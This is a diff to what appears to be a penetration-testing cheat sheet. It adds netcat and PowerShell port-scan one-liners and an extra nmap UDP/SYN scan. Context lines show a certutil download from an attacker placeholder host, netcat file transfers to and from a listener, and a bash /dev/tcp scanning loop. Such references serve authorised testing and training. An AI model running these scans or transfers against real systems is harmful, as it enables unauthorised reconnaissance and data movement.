@@ -596,6 +596,13 @@ certutil -urlcache -split -f "http://<LHOST>/<FILE>" <FILE>
 
 ##### Netcat
 
+Scan ports
+
+```c
+nc -nvv -w 1 -z IP FromPORTs-ToPORTS     in TCP
+nc -nv -u -z -w 1 IP FromPORTs-ToPORTS     in UDP
+```
+
 ```c
 nc -lnvp <LPORT> < <FILE>
 nc <RHOST> <RPORT> > <FILE>
@@ -2229,7 +2236,8 @@ SCAN SYN or hidden
 UDP SCAN
 
 ```c
-nmap -sU ip
+nmap -sU IP
+sudo nmap -sU -sS IP
 ```
 
 udp-proto-scanner.pl
@@ -2332,7 +2340,7 @@ All ports Scan
   Nmap HTB ports=$(nmap -p- --min-rate=1000  -T4 IP PORT | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)nmap 
 ```
 
-#### Port Scanning
+#### Script Port Scanning
 
 ```c
 for p in {1..65535}; do nc -vn <RHOST> $p -w 1 -z & done 2> <FILE>.txt
@@ -2340,6 +2348,12 @@ for p in {1..65535}; do nc -vn <RHOST> $p -w 1 -z & done 2> <FILE>.txt
 
 ```c
 export ip=<RHOST>; for port in $(seq 1 65535); do timeout 0.01 bash -c "</dev/tcp/$ip/$port && echo The port $port is open || echo The Port $port is closed > /dev/null" 2>/dev/null || echo Connection Timeout > /dev/null; done
+```
+
+Powershell
+
+```c
+1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("IP", $_)) "TCP port $_ is open"} 2>$null
 ```
 
 #### snmpwalk
